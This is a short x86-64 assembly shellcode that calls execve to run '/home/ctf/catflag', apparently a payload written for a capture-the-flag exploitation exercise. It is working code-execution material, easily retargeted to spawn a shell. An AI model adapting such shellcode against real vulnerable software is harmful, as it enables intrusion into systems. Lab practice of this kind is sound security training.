.global _start
_start:
.intel_syntax noprefix
	mov eax, 59
	lea edi, [rip+binsh]
	mov esi, 0
	mov edx, 0
	syscall
binsh:
	.string "/home/ctf/catflag"
	